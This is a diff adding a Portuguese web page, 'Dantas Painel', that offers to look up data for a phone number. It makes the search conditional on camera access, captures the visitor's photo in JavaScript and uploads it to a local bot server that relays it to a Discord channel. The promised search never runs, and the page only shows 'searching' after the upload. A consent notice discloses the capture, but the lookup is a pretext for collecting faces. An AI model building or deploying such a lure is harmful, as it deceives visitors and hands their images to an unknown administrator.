@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Dantas Painel</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: #0a0a0a;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .painel {
+            width: 90%;
+            max-width: 420px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 0 30px rgba(0,0,0,.6);
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .subtitulo {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: white;
+            outline: none;
+            margin-bottom: 15px;
+        }
+
+        input:focus {
+            border-color: #666;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            background: white;
+            color: black;
+            font-weight: bold;
+            cursor: pointer;
+            transition: .2s;
+        }
+
+        button:hover {
+            transform: scale(1.02);
+        }
+
+        .aviso {
+            background: #181818;
+            border: 1px solid #292929;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+            margin-bottom: 15px;
+            color: #aaa;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .oculto {
+            display: none;
+        }
+
+        #camera {
+            width: 100%;
+            margin-top: 20px;
+            border-radius: 10px;
+            display: none;
+        }
+
+        #foto {
+            display: none;
+        }
+
+        .mensagem {
+            text-align: center;
+            color: #aaa;
+            line-height: 1.6;
+        }
+
+        .erro {
+            color: #ff6666;
+        }
+
+        .voltar {
+            margin-top: 15px;
+            background: #222;
+            color: white;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="painel">
+
+        <!-- FORMULÁRIO -->
+        <div id="formulario">
+
+            <h1>Dantas Painel</h1>
+
+            <p class="subtitulo">
+                Pesquisa demonstrativa
+            </p>
+
+            <input
+                type="text"
+                id="numero"
+                placeholder="Coloque o número"
+            >
+
+            <button onclick="mostrarConsentimento()">
+                Pesquisar dados
+            </button>
+
+        </div>
+
+
+        <!-- CONSENTIMENTO -->
+        <div id="consentimento" class="oculto">
+
+            <h1>Permissão da câmera</h1>
+
+            <div class="aviso">
+                Para continuar, este site precisa acessar sua câmera
+                e tirar <strong>uma foto</strong>.
+                <br><br>
+                A foto será enviada ao canal do Discord configurado
+                pelo administrador deste painel.
+                <br><br>
+                Você pode negar a permissão do navegador se não quiser
+                continuar.
+            </div>
+
+            <button onclick="ativarCamera()">
+                Permitir acesso à câmera e continuar
+            </button>
+
+        </div>
+
+
+        <!-- CÂMERA -->
+        <video id="camera" autoplay playsinline></video>
+
+        <canvas id="foto"></canvas>
+
+
+        <!-- PESQUISANDO -->
+        <div id="pesquisando" class="oculto">
+
+            <h1>Pesquisando</h1>
+
+            <p class="mensagem">
+                Pesquisando dados, aguarde um momento.
+            </p>
+
+        </div>
+
+
+        <!-- ERRO -->
+        <div id="erro" class="oculto">
+
+            <h1>Permissão negada</h1>
+
+            <p class="mensagem erro">
+                Não foi possível fazer a pesquisa pois não foi aceita
+                a permissão da câmera.
+            </p>
+
+            <button class="voltar" onclick="voltar()">
+                Tentar novamente
+            </button>
+
+        </div>
+
+    </div>
+
+
+    <script>
+
+        function mostrarConsentimento() {
+
+            const numero = document.getElementById("numero").value.trim();
+
+            if (!numero) {
+                alert("Coloque um número primeiro.");
+                return;
+            }
+
+            document.getElementById("formulario").style.display = "none";
+            document.getElementById("consentimento").classList.remove("oculto");
+        }
+
+
+        async function ativarCamera() {
+
+            try {
+
+                const stream =
+                    await navigator.mediaDevices.getUserMedia({
+                        video: true
+                    });
+
+                const video =
+                    document.getElementById("camera");
+
+                video.srcObject = stream;
+                video.style.display = "block";
+
+                await new Promise(resolve => {
+
+                    video.onloadedmetadata = resolve;
+
+                });
+
+
+                // Captura uma única foto
+                const canvas =
+                    document.getElementById("foto");
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                const contexto =
+                    canvas.getContext("2d");
+
+                contexto.drawImage(
+                    video,
+                    0,
+                    0,
+                    canvas.width,
+                    canvas.height
+                );
+
+
+                // Desliga a câmera
+                stream.getTracks().forEach(track => {
+                    track.stop();
+                });
+
+                video.style.display = "none";
+
+
+                // Converte a foto para arquivo
+                canvas.toBlob(async (blob) => {
+
+                    if (!blob) {
+                        mostrarErro();
+                        return;
+                    }
+
+                    const dados = new FormData();
+
+                    dados.append(
+                        "foto",
+                        blob,
+                        "foto-camera.jpg"
+                    );
+
+                    dados.append(
+                        "consentimento",
+                        "sim"
+                    );
+
+
+                    try {
+
+                        const resposta = await fetch(
+                            "http://localhost:3000/enviar-foto",
+                            {
+                                method: "POST",
+                                body: dados
+                            }
+                        );
+
+
+                        const resultado =
+                            await resposta.json();
+
+
+                        if (resultado.sucesso) {
+
+                            document
+                                .getElementById("consentimento")
+                                .classList.add("oculto");
+
+                            document
+                                .getElementById("pesquisando")
+                                .classList.remove("oculto");
+
+                        } else {
+
+                            mostrarErro();
+
+                        }
+
+                    } catch (erro) {
+
+                        console.error(erro);
+
+                        alert(
+                            "Não foi possível conectar ao servidor. " +
+                            "Verifique se o bot está funcionando."
+                        );
+
+                    }
+
+                }, "image/jpeg", 0.9);
+
+
+            } catch (erro) {
+
+                console.error(erro);
+
+                mostrarErro();
+
+            }
+        }
+
+
+        function mostrarErro() {
+
+            document
+                .getElementById("consentimento")
+                .classList.add("oculto");
+
+            document
+                .getElementById("camera")
+                .style.display = "none";
+
+            document
+                .getElementById("erro")
+                .classList.remove("oculto");
+        }
+
+
+        function voltar() {
+
+            document
+                .getElementById("erro")
+                .classList.add("oculto");
+
+            document
+                .getElementById("formulario")
+                .style.display = "block";
+        }
+
+    </script>
+
+</body>
+</html>
